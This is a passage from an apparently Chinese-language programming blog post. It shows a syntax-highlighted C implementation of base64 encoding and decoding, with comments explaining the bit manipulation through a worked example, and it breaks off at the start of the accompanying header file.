class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  base64.c</span></span><br><span class=\"line\"><span class=\"comment\">//  base64</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  Created by guofu on 2017/5/25.</span></span><br><span class=\"line\"><span class=\"comment\">//  Copyright © 2017年 guofu. All rights reserved.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">*  转解码过程</span></span><br><span class=\"line\"><span class=\"comment\">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span></span><br><span class=\"line\"><span class=\"comment\">*  先将要编码的转成对应的ASCII值</span></span><br><span class=\"line\"><span class=\"comment\">*  如编码: s 1 3</span></span><br><span class=\"line\"><span class=\"comment\">*  对应ASCII值为: 115 49 51</span></span><br><span class=\"line\"><span class=\"comment\">*  对应二进制为: 01110011 00110001 00110011</span></span><br><span class=\"line\"><span class=\"comment\">*  将其6个分组分4组: 011100 110011 000100 110011</span></span><br><span class=\"line\"><span class=\"comment\">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span></span><br><span class=\"line\"><span class=\"comment\">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span></span><br><span class=\"line\"><span class=\"comment\">*  查找base64 转换表 对应 c z E z</span></span><br><span class=\"line\"><span class=\"comment\">*</span></span><br><span class=\"line\"><span class=\"comment\">*  解码</span></span><br><span class=\"line\"><span class=\"comment\">*  c z E z</span></span><br><span class=\"line\"><span class=\"comment\">*  对应ASCII值为 99 122 69 122</span></span><br><span class=\"line\"><span class=\"comment\">*  对应表base64_suffix_map的值为 28 51 4 51</span></span><br><span class=\"line\"><span class=\"comment\">*  对应二进制值为 00011100 00110011 00000100 00110011</span></span><br><span class=\"line\"><span class=\"comment\">*  依次去除每组的前两位, 再拼接成3字节</span></span><br><span class=\"line\"><span class=\"comment\">*  即: 01110011 00110001 00110011</span></span><br><span class=\"line\"><span class=\"comment\">*  对应的就是s 1 3</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// base64 转换表, 共64个</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> base64_alphabet[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;A&#x27;</span>, <span class=\"string\">&#x27;B&#x27;</span>, <span class=\"string\">&#x27;C&#x27;</span>, <span class=\"string\">&#x27;D&#x27;</span>, <span class=\"string\">&#x27;E&#x27;</span>, <span class=\"string\">&#x27;F&#x27;</span>, <span class=\"string\">&#x27;G&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;H&#x27;</span>, <span class=\"string\">&#x27;I&#x27;</span>, <span class=\"string\">&#x27;J&#x27;</span>, <span class=\"string\">&#x27;K&#x27;</span>, <span class=\"string\">&#x27;L&#x27;</span>, <span class=\"string\">&#x27;M&#x27;</span>, <span class=\"string\">&#x27;N&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;O&#x27;</span>, <span class=\"string\">&#x27;P&#x27;</span>, <span class=\"string\">&#x27;Q&#x27;</span>, <span class=\"string\">&#x27;R&#x27;</span>, <span class=\"string\">&#x27;S&#x27;</span>, <span class=\"string\">&#x27;T&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;U&#x27;</span>, <span class=\"string\">&#x27;V&#x27;</span>, <span class=\"string\">&#x27;W&#x27;</span>, <span class=\"string\">&#x27;X&#x27;</span>, <span class=\"string\">&#x27;Y&#x27;</span>, <span class=\"string\">&#x27;Z&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>, <span class=\"string\">&#x27;e&#x27;</span>, <span class=\"string\">&#x27;f&#x27;</span>, <span class=\"string\">&#x27;g&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;h&#x27;</span>, <span class=\"string\">&#x27;i&#x27;</span>, <span class=\"string\">&#x27;j&#x27;</span>, <span class=\"string\">&#x27;k&#x27;</span>, <span class=\"string\">&#x27;l&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>, <span class=\"string\">&#x27;n&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;o&#x27;</span>, <span class=\"string\">&#x27;p&#x27;</span>, <span class=\"string\">&#x27;q&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>, <span class=\"string\">&#x27;t&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;u&#x27;</span>, <span class=\"string\">&#x27;v&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, <span class=\"string\">&#x27;x&#x27;</span>, <span class=\"string\">&#x27;y&#x27;</span>, <span class=\"string\">&#x27;z&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;0&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>, <span class=\"string\">&#x27;5&#x27;</span>, <span class=\"string\">&#x27;6&#x27;</span>, <span class=\"string\">&#x27;7&#x27;</span>, <span class=\"string\">&#x27;8&#x27;</span>, <span class=\"string\">&#x27;9&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;+&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解码时使用</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> base64_suffix_map[<span class=\"number\">256</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">253</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">253</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">253</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,  <span class=\"number\">62</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,  <span class=\"number\">63</span>,</span><br><span class=\"line\">    <span class=\"number\">52</span>,  <span class=\"number\">53</span>,  <span class=\"number\">54</span>,  <span class=\"number\">55</span>,  <span class=\"number\">56</span>,  <span class=\"number\">57</span>,  <span class=\"number\">58</span>,  <span class=\"number\">59</span>,  <span class=\"number\">60</span>,  <span class=\"number\">61</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">254</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,   <span class=\"number\">0</span>,   <span class=\"number\">1</span>,   <span class=\"number\">2</span>,   <span class=\"number\">3</span>,   <span class=\"number\">4</span>,   <span class=\"number\">5</span>,   <span class=\"number\">6</span>,</span><br><span class=\"line\">    <span class=\"number\">7</span>,   <span class=\"number\">8</span>,   <span class=\"number\">9</span>,  <span class=\"number\">10</span>,  <span class=\"number\">11</span>,  <span class=\"number\">12</span>,  <span class=\"number\">13</span>,  <span class=\"number\">14</span>,  <span class=\"number\">15</span>,  <span class=\"number\">16</span>,  <span class=\"number\">17</span>,  <span class=\"number\">18</span>,</span><br><span class=\"line\">    <span class=\"number\">19</span>,  <span class=\"number\">20</span>,  <span class=\"number\">21</span>,  <span class=\"number\">22</span>,  <span class=\"number\">23</span>,  <span class=\"number\">24</span>,  <span class=\"number\">25</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>,  <span class=\"number\">26</span>,  <span class=\"number\">27</span>,  <span class=\"number\">28</span>,  <span class=\"number\">29</span>,  <span class=\"number\">30</span>,  <span class=\"number\">31</span>,  <span class=\"number\">32</span>,  <span class=\"number\">33</span>,  <span class=\"number\">34</span>,  <span class=\"number\">35</span>,  <span class=\"number\">36</span>,</span><br><span class=\"line\">    <span class=\"number\">37</span>,  <span class=\"number\">38</span>,  <span class=\"number\">39</span>,  <span class=\"number\">40</span>,  <span class=\"number\">41</span>,  <span class=\"number\">42</span>,  <span class=\"number\">43</span>,  <span class=\"number\">44</span>,  <span class=\"number\">45</span>,  <span class=\"number\">46</span>,  <span class=\"number\">47</span>,  <span class=\"number\">48</span>,</span><br><span class=\"line\">    <span class=\"number\">49</span>,  <span class=\"number\">50</span>,  <span class=\"number\">51</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>,</span><br><span class=\"line\">    <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> <span class=\"title function_\">cmove_bits</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> src, <span class=\"type\">unsigned</span> lnum, <span class=\"type\">unsigned</span> rnum)</span> &#123;</span><br><span class=\"line\">    src &lt;&lt;= lnum; <span class=\"comment\">// src = src &lt;&lt; lnum;</span></span><br><span class=\"line\">    src &gt;&gt;= rnum; <span class=\"comment\">// src = src &gt;&gt; rnum;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> src;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">base64_encode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata, <span class=\"type\">int</span> *outlen)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>; <span class=\"comment\">// return value</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (indata == <span class=\"literal\">NULL</span> || inlen == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> in_len = <span class=\"number\">0</span>; <span class=\"comment\">// 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数</span></span><br><span class=\"line\">    <span class=\"type\">int</span> pad_num = <span class=\"number\">0</span>; <span class=\"comment\">// 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inlen % <span class=\"number\">3</span> != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        pad_num = <span class=\"number\">3</span> - inlen % <span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    in_len = inlen + pad_num; <span class=\"comment\">// 拼接后的长度, 实际编码需要的长度(3的倍数)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> out_len = in_len * <span class=\"number\">8</span> / <span class=\"number\">6</span>; <span class=\"comment\">// 编码后的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> *p = outdata; <span class=\"comment\">// 定义指针指向传出data的首地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">                       <span class=\"comment\">//编码, 长度为调整后的长度, 3字节一组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; in_len; i += <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> value = *indata &gt;&gt; <span class=\"number\">2</span>; <span class=\"comment\">// 将indata第一个字符向右移动2bit(丢弃2bit)</span></span><br><span class=\"line\">        <span class=\"type\">char</span> c = base64_alphabet[value]; <span class=\"comment\">// 对应base64转换表的字符</span></span><br><span class=\"line\">        *p = c; <span class=\"comment\">// 将对应字符(编码后字符)赋值给outdata第一字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//处理最后一组(最后3字节)的数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i == inlen + pad_num - <span class=\"number\">3</span> &amp;&amp; pad_num != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (pad_num == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                *(p + <span class=\"number\">1</span>) = base64_alphabet[(<span class=\"type\">int</span>)(cmove_bits(*indata, <span class=\"number\">6</span>, <span class=\"number\">2</span>) + cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">0</span>, <span class=\"number\">4</span>))];</span><br><span class=\"line\">                *(p + <span class=\"number\">2</span>) = base64_alphabet[(<span class=\"type\">int</span>)cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">4</span>, <span class=\"number\">2</span>)];</span><br><span class=\"line\">                *(p + <span class=\"number\">3</span>) = <span class=\"string\">&#x27;=&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pad_num == <span class=\"number\">2</span>) &#123; <span class=\"comment\">// 编码后的数据要补两个 &#x27;=&#x27;</span></span><br><span class=\"line\">                *(p + <span class=\"number\">1</span>) = base64_alphabet[(<span class=\"type\">int</span>)cmove_bits(*indata, <span class=\"number\">6</span>, <span class=\"number\">2</span>)];</span><br><span class=\"line\">                *(p + <span class=\"number\">2</span>) = <span class=\"string\">&#x27;=&#x27;</span>;</span><br><span class=\"line\">                *(p + <span class=\"number\">3</span>) = <span class=\"string\">&#x27;=&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123; <span class=\"comment\">// 处理正常的3字节的数据</span></span><br><span class=\"line\">            *(p + <span class=\"number\">1</span>) = base64_alphabet[cmove_bits(*indata, <span class=\"number\">6</span>, <span class=\"number\">2</span>) + cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">0</span>, <span class=\"number\">4</span>)];</span><br><span class=\"line\">            *(p + <span class=\"number\">2</span>) = base64_alphabet[cmove_bits(*(indata + <span class=\"number\">1</span>), <span class=\"number\">4</span>, <span class=\"number\">2</span>) + cmove_bits(*(indata + <span class=\"number\">2</span>), <span class=\"number\">0</span>, <span class=\"number\">6</span>)];</span><br><span class=\"line\">            *(p + <span class=\"number\">3</span>) = base64_alphabet[*(indata + <span class=\"number\">2</span>) &amp; <span class=\"number\">0x3f</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        p += <span class=\"number\">4</span>;</span><br><span class=\"line\">        indata += <span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (outlen != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        *outlen = out_len;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">base64_decode</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *indata, <span class=\"type\">int</span> inlen, <span class=\"type\">char</span> *outdata)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (indata == <span class=\"literal\">NULL</span> || inlen &lt;= <span class=\"number\">0</span> || outdata == <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (inlen % <span class=\"number\">4</span> != <span class=\"number\">0</span>) &#123; <span class=\"comment\">// 需要解码的数据不是4字节倍数</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret = <span class=\"number\">-2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> t = <span class=\"number\">0</span>, x = <span class=\"number\">0</span>, y = <span class=\"number\">0</span>, i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> c = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> g = <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (indata[x] != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 需要解码的数据对应的ASCII值对应base64_suffix_map的值</span></span><br><span class=\"line\">        c = base64_suffix_map[indata[x++]];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">255</span>) <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;<span class=\"comment\">// 对应的值不在转码表中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">253</span>) <span class=\"keyword\">continue</span>;<span class=\"comment\">// 对应的值是换行或者回车</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c == <span class=\"number\">254</span>) &#123; c = <span class=\"number\">0</span>; g--; &#125;<span class=\"comment\">// 对应的值是&#x27;=&#x27;</span></span><br><span class=\"line\">        t = (t &lt;&lt; <span class=\"number\">6</span>) | c; <span class=\"comment\">// 将其依次放入一个int型中占3字节</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (++y == <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">            outdata[i++] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)((t &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (g &gt; <span class=\"number\">1</span>) outdata[i++] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)((t &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (g &gt; <span class=\"number\">2</span>) outdata[i++] = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(t &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            y = t = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>base64.h</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> base64_h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> base64_h</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span 